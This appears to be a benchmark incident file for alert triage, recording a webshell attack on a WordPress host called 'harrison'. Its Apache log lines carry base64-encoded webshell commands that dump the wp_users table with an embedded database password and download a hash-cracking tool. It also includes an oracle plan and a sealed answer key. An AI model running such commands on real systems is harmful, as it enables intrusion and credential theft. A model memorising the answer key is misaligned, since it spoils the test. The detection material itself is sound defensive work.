@@ -1,0 +1,168 @@
+{
+  "incident_id": "ait-harrison-webshell",
+  "name": "AIT-ADS harrison/webshell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "harrison/webshell",
+  "alert": {
+    "timestamp": "2022-02-08T07:56:31Z",
+    "host": "harrison",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on harrison. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-02-08T07:56:31Z",
+    "end": "2022-02-08T07:56:37Z",
+    "hosts": [
+      "harrison"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-55d5d448",
+        "timestamp": "2022-02-08T07:56:31Z",
+        "host": "harrison",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:56:31 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507682 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644306991.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:56:31 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507682 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-0ae1d981",
+        "timestamp": "2022-02-08T07:56:37Z",
+        "host": "harrison",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644306997.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-55d5d448",
+      "source": "alerts",
+      "timestamp": "2022-02-08T07:56:31Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:56:31 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507682 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644306991.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:56:31 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 507682 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-0ae1d981",
+      "source": "alerts",
+      "timestamp": "2022-02-08T07:56:37Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644306997.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "harrison"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "harrison"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on harrison. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "harrison"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "harrison"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on harrison. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "harrison/webshell",
+    "answer": "webshell",
+    "accept": [
+      "webshell",
+      "webshell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
